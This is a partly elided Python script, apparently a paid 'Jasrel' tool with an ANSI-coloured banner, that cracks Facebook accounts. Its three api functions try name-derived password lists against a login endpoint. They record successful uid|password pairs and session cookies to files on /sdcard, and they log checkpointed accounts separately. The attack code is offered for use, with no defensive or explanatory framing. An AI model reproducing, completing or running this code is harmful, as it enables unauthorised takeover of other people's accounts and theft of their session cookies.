...
logo = f"""
    rprint("""
              ...
              {}╚══════╝{}╚═╝  ╚═╝{} ╚════╝ {}╚═╝  ╚═╝
                    ...
                    Jasrel 🔥
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWONER     \x1b[1;97m● \033[38;5;46mJASREL
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mFacebook   \x1b[1;97m● \033[38;5;46mJASREL
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGuthub   \x1b[1;97m  ● \033[38;5;46mJASREL17
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTools      \x1b[1;97m● \033[38;5;46mPAID
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mVersion    \x1b[1;97m● \033[38;5;46mV/0.1
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[GIRLFRIEND]  \x1b[1;97m● \033[38;5;84m[\x1b[1;95mGEHLEE\033[38;5;84m]
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#-----------------------[ CLEAR-CODE ]-----------------------#
...
def api1(ids,names,passlist):
    try:
        ...
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mJasrel\x1b[1;97m-\x1b[38;5;46mM1\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mJasrel\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'Jasrel-FILE-OK.txt')
                    open('/sdcard/Jasrel-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    ...
                    print(f'\r\r\33[1m\33[1;35m [JAS-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'JAS-FILE-CP.txt')
                    open('/sdcard/Jasrel-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mJasrel\x1b[1;97m-\x1b[38;5;46mM2\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    #line()
                    file_path = os.path.join(folder_path, 'Jas-FILE-OK.txt')
                    open('/sdcard/Toxic/Jas-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
...
def api3(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mJasrel\x1b[1;97m-M3\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mToxic\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'GEHLEE-FILE-OK.txt')
                    open('/sdcard/GEHLEE-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [GEHLEE-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'GEHLEE-FILE-CP.txt')
                    open('/sdcard/GEHLEE-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
